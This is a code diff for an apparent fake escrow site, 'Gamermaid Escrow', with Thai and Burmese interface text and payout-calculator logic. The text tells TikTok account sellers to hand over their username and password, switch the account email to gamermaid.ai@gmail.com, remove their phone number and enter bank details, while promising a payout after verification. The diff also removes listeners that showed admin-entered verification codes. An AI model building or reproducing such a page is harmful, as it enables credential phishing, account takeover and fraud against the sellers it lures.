+                noticePhone: "จำเป็น: ลบหมายเลขโทรศัพท์ออกจากบัญชี TikTok ของคุณก่อนส่งข้อมูล",
+                lblLocation: "สถานที่เข้าสู่ระบบ",
+                phLocation: "เมือง / ภูมิภาค",
+                lblSignupDate: "วันที่สมัคร",
+                lblPhoneModel: "รุ่นโทรศัพท์",
+                phPhoneModel: "เช่น iPhone 14 Pro",
+                bankInfo: "ข้อมูลธนาคาร",
+                supportedBanks: "ธนาคารพันธมิตรในเอเชียที่รองรับ",
+                lblBankName: "ชื่อธนาคาร",
+                optSelectBank: "เลือกธนาคารของคุณ",
+                lblHolder: "ชื่อเจ้าของบัญชี",
+                phHolder: "ชื่อ-นามสกุล",
+                lblAccNum: "เลขที่บัญชี",
+                phAccNum: "เลขที่บัญชี / IBAN",
+                lblSwift: "รหัส SWIFT",
+                phSwift: "SWIFT / BIC",
+                btnContinue: "ดำเนินการต่อ",
+                rulesTitle: "ข้อกำหนดและกฎระเบียบของเอสโครว์",
+                rule1: "ข้อมูลรับรองบัญชีทั้งหมดที่ระบุต้องถูกต้องและทีมผู้ดูแลระบบของเราสามารถเข้าถึงได้อย่างสมบูรณ์ระหว่างการตรวจสอบ",
+                rule2: "ผู้ขายต้องแน่ใจว่าได้ยกเลิกการเชื่อมโยงหมายเลขโทรศัพท์ออกจากบัญชีก่อนที่จะส่ง",
+                rule3: "การจ่ายเงินจะดำเนินการภายใน 24 ชั่วโมงอย่างเคร่งครัดหลังจากการตรวจสอบและการโอนเงินเสร็จสิ้น",
+                rule4: "การส่งข้อมูลที่เป็นเท็จ ข้อมูลธนาคารที่ไม่ถูกต้อง หรือความพยายามในการเรียกคืนบัญชีจะส่งผลให้ธุรกรรมเอสโครว์ถูกยกเลิกทันที",
+                rule5: "สำหรับการสอบถามข้อมูลสนับสนุน โปรดติดต่อทีมงานของเราโดยตรงที่ ai@gamermaid.site",
+                contactTitle: "ติดต่อทีมงานของเรา",
+                contactSub: "ติดต่อฝ่ายสนับสนุนของ Gamermaid สำหรับข้อสงสัยเกี่ยวกับเอสโครว์และคนกลาง",
+                boxEmails: "อีเมลอย่างเป็นทางการ",
+                boxPhone: "โทรศัพท์สนับสนุน (สำนักงานญี่ปุ่น)",
+                boxAddress: "สำนักงานใหญ่ภูมิภาค (โตเกียว)",
+                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
+                supportNote: "ทีมสนับสนุนของเราให้บริการตลอด 24/7 เพื่อแก้ไขปัญหาการเคลียร์ริ่งคนกลางและคำถามเกี่ยวกับการยืนยันตัวตน",
+                chatHeader: "แชทกับผู้ดูแลระบบ",
+                chatWelcome: "สวัสดี! ยินดีต้อนรับสู่ Gamermaid Escrow เราจะช่วยคุณได้อย่างไรวันนี้?",
+                phChat: "พิมพ์ข้อความ...",
+                chatSend: "ส่ง",
+                modalTitle: "กำลังดำเนินการตรวจสอบ",
+                modalDesc: "ผู้ดูแลระบบกำลังตรวจสอบบัญชีของคุณ เราจะส่งเงินของคุณไปยังบัญชีธนาคารหลัง 24 ชั่วโมง",
+                modalWarning: "(โปรดตรวจสอบให้แน่ใจว่าคุณกรอกข้อมูลธนาคารอย่างถูกต้อง)",
+                closeWindow: "ปิดหน้าต่าง"
+            },
+            my: {
+                navEscrow: "အက်စခရိုး ဝန်ဆောင်မှုများ",
+                navBuyers: "အတည်ပြုပြီး ဝယ်ယူသူများ",
+                navContact: "ဆက်သွယ်ရန်",
+                signIn: "အကောင့်ဝင်ရန်",
+                escrowTitle: "တတိယပါတီ အက်စခရိုး ဝန်ဆောင်မှုများ",
+                escrowSub: "လုံခြုံစိတ်ချရသော အလိုအလျောက် အတည်ပြုခြင်းနှင့် ကြားခံရှင်းလင်းရေးစနစ်။",
+                depositLabel: "တောင်းဆိုထားသော ပမာဏ",
+                totalLabel: "သင်ရရှိမည့်ငွေ",
+                accVerification: "အကောင့် အတည်ပြုခြင်း",
+                emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပါ",
+                lblUsername: "အသုံးပြုသူအမည် (Username)",
+                phUsername: "အကောင့်အမည် ထည့်ပါ",
+                lblPassword: "စကားဝှက် (Password)",
+                phPassword: "စကားဝှက် ထည့်ပါ",
+                noticePhone: "လိုအပ်ချက်- မတင်သွင်းမီ သင်၏ TikTok အကောင့်တွင် ဖုန်းနံပါတ်ကို ဖြုတ်ထားပါ။",
+                lblLocation: "ဝင်ရောက်သည့်နေရာ",
+                phLocation: "မြို့ / ဒေသ",
+                lblSignupDate: "စာရင်းသွင်းသည့်ရက်စွဲ",
+                lblPhoneModel: "ဖုန်းမော်ဒယ်",
+                phPhoneModel: "ဥပမာ - iPhone 14 Pro",
+                bankInfo: "ဘဏ်အချက်အလက်",
+                supportedBanks: "ချိတ်ဆက်ဆောင်ရွက်နေသော အာရှဘဏ်များ",
+                lblBankName: "ဘဏ်အမည်",
+                optSelectBank: "သင့်ဘဏ်ကို ရွေးချယ်ပါ",
+                lblHolder: "ဘဏ်အကောင့်ပိုင်ရှင် အမည်",
+                phHolder: "အပြည့်အစုံ",
+                lblAccNum: "ဘဏ်အကောင့်နံပါတ်",
+                phAccNum: "အကောင့်နံပါတ် / IBAN",
+                lblSwift: "SWIFT ကုဒ်",
+                phSwift: "SWIFT / BIC",
+                btnContinue: "ဆက်လုပ်ရန်",
+                rulesTitle: "အက်စခရိုး စည်းမျဉ်းစည်းကမ်းများ",
+                rule1: "ပေးထားသော အကောင့်အချက်အလက် အားလုံးသည် တိကျရမည်ဖြစ်ပြီး စစ်ဆေးနေစဉ်အတွင်း ကျွန်ုပ်တို့၏ အက်ဒမင်အဖွဲ့မှ အပြည့်အဝ ဝင်ရောက်စစ်ဆေးနိုင်ရပါမည်။",
+                rule2: "ရောင်းချသူများသည် တတင်သွင်းမီ အကောင့်နှင့်ချိတ်ဆက်ထားသော ဖုန်းနံပါတ်များကို လုံးဝဖြုတ်ထားရမည်။",
+                rule3: "ငွေထုတ်ပေးခြင်းကို အတည်ပြုချက်နှင့် လွှဲပြောင်းမှု ပြီးမြောက်ပြီးနောက် ၂၄ နာရီအတွင်း တိကျစွာ လုပ်ဆောင်ပေးပါမည်။",
+                rule4: "လိမ်လည်တင်သွင်းခြင်း၊ ဘဏ်အချက်အလက် မှားယွင်းခြင်း သို့မဟုတ် အကောင့်ပြန်ယူရန် ကြိုးပမ်းခြင်းများသည် အက်စခရိုး ငွေပေးငွေယူမှုကို ချက်ချင်း ပယ်ဖျက်မည်ဖြစ်သည်။",
+                rule5: "အကူအညီလိုအပ်ပါက ai@gamermaid.site သို့ တိုက်ရိုက် ဆက်သွယ်နိုင်ပါသည်။",
+                contactTitle: "ကျွန်ုပ်တို့၏အဖွဲ့ကို ဆက်သွယ်ရန်",
+                contactSub: "အက်စခရိုးနှင့် ကြားခံစုံစမ်းမေးမြန်းမှုများအတွက် Gamermaid အထောက်အကူပြုအဖွဲ့ထံ ဆက်သွယ်ပါ။",
+                boxEmails: "တရားဝင် အီးမေးလ်များ",
+                boxPhone: "ထောက်ူပံ့ရေး ဖုန်းနံပါတ် (ဂျပန်ရုံး)",
+                boxAddress: "ဒေသဆိုင်ရာ ရုံးချုပ် (တိုကျို)",
+                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
+                supportNote: "ကျွန်ုပ်တို့၏ အထောက်အကူပြုအဖွဲ့သည် ကြားခံရှင်းလင်းရေးနှင့် အတည်ပြုချက်မေးခွန်းများကို ဖြေရှင်းရန် ၂၄ နာရီပတ်လုံး လုပ်ဆောင်နေပါသည်။",
+                chatHeader: "အက်ဒမင်နှင့် စကားပြောရန်",
+                chatWelcome: "မင်္ဂလာပါ! Gamermaid Escrow မှ ကြိုဆိုပါတယ်။ ယနေ့ မည်သို့ကူညီပေးရမလဲ?",
+                phChat: "စာတို ရိုက်ထည့်ပါ...",
+                chatSend: "ပို့ရန်",
+                modalTitle: "အတည်ပြုစစ်ဆေးနေဆဲဖြစ်သည်",
+                modalDesc: "အက်ဒမင်များမှ သင့်အကောင့်ကို စစ်ဆေးနေပါသည်။ ၂၄ နာရီအတွင်း သင့်ဘဏ်အကောင့်သို့ ငွေလွှဲပေးပါမည်။",
+                modalWarning: "(ဘဏ်အချက်အလက်များကို မှန်ကန်စွာ ဖြည့်သွင်းရန် သေချာစေပါ)။",
+                closeWindow: "ဝင်းဒိုးပိတ်ရန်"
+            }
+        };
+
+        function changeLanguage(lang) {
+            const t = translations[lang] || translations.en;
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (t[key]) el.textContent = t[key];
+            });
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (t[key]) el.placeholder = t[key];
+            });
+            localStorage.setItem('gamermaid_lang', lang);
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
+            const languageSelector = document.getElementById('languageSelector');
+            const savedLang = localStorage.getItem('gamermaid_lang') || 'en';
+            languageSelector.value = savedLang;
+            changeLanguage(savedLang);
+
+            languageSelector.addEventListener('change', (e) => changeLanguage(e.target.value));
+
+            // Dynamic Payout Calculator Logic
+            const requestedPriceInput = document.getElementById('requestedPrice');
+            const currencySelect = document.getElementById('currencySelect');
+            const displayDepositAmt = document.getElementById('displayDepositAmt');
+            const displayFeeLabel = document.getElementById('displayFeeLabel');
+            const displayFeeAmt = document.getElementById('displayFeeAmt');
+            const displayTotalPayout = document.getElementById('displayTotalPayout');
+
+            function updateCalculator() {
+                const amount = parseFloat(requestedPriceInput.value) || 0;
+                const currency = currencySelect.value;
+                const fee = (amount * 7) / 100;
+                const total = amount - fee;
+
+                const formattedAmount = amount.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+                const formattedFee = fee.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+                const formattedTotal = total.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+
+                displayDepositAmt.textContent = `${formattedAmount} ${currency}`;
+                displayFeeLabel.textContent = `Middle Man Fee (7%)`;
+                displayFeeAmt.textContent = `- ${formattedFee} ${currency}`;
+                displayTotalPayout.textContent = `${formattedTotal} ${currency}`;
+            }
+
+            requestedPriceInput.addEventListener('input', updateCalculator);
+            currencySelect.addEventListener('change', updateCalculator);
+            updateCalculator();
+
             // Navigation tabs switching
             const navLinks = document.querySelectorAll('.nav-link[data-tab]');
             const escrowPage = document.getElementById('escrowPage');
@@ -382,42 +773,6 @@
                         window.scrollTo({ top: 0, behavior: 'smooth' });
                     }
                 });
-            });
-
-            // 1. Live Sync for Deposit Rates from Admin Panel Config
-            const displayDepositAmt = document.getElementById('displayDepositAmt');
-            const displayFeeLabel = document.getElementById('displayFeeLabel');
-            const displayFeeAmt = document.getElementById('displayFeeAmt');
-            const displayTotalPayout = document.getElementById('displayTotalPayout');
-
-            onSnapshot(doc(db, "site_config", "main"), (docSnap) => {
-                if (docSnap.exists()) {
-                    const data = docSnap.data();
-                    const deposit = parseFloat(data.depositAmount) || 2000000;
-                    const feePercent = parseFloat(data.feePercent) || 7;
-                    const currency = data.currencyUnit || 'Kyats';
-
-                    const feeAmount = (deposit * feePercent) / 100;
-                    const payoutTotal = deposit - feeAmount;
-
-                    displayDepositAmt.textContent = `${deposit.toLocaleString()} ${currency}`;
-                    displayFeeLabel.textContent = `Middle Man Fee (${feePercent}%)`;
-                    displayFeeAmt.textContent = `- ${feeAmount.toLocaleString()} ${currency}`;
-                    displayTotalPayout.textContent = `${payoutTotal.toLocaleString()} ${currency}`;
-                }
-            });
-
-            // 2. Live Firebase Listener for Verification Code typed in Admin Panel
-            const adminCodeDisplay = document.getElementById('adminCodeDisplay');
-            onSnapshot(doc(db, "escrow_requests", "latest_code"), (docSnap) => {
-                if (docSnap.exists()) {
-                    const data = docSnap.data();
-                    if (data.code) {
-                        adminCodeDisplay.textContent = data.code;
-                        adminCodeDisplay.style.color = "#22c55e";
-                        adminCodeDisplay.style.borderColor = "#22c55e";
-                    }
-                }
             });
 
             // Live Sales Feed
